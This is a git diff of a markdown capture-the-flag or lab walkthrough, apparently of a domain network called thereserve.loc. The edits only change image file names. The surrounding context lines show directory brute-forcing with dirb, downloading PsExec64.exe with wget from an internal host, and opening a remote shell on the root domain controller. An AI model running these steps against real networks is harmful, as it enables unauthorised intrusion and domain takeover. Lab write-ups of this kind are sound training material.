@@ -55,7 +55,7 @@ This ran for the majority of the time I was working on the box, I found the word
 dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (81) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (81) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Looking for php files we found the info file which can be used to find info about the server.
 
@@ -1479,7 +1479,7 @@ wget http://10.200.89.12:81/PsExec64.exe -O PsExec64.exe
 .\PsExec64.exe \\rootdc.thereserve.loc cmd.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (81) (2).png" alt=""><figcaption></figcaption></figure>
 
 **RootDC**
 
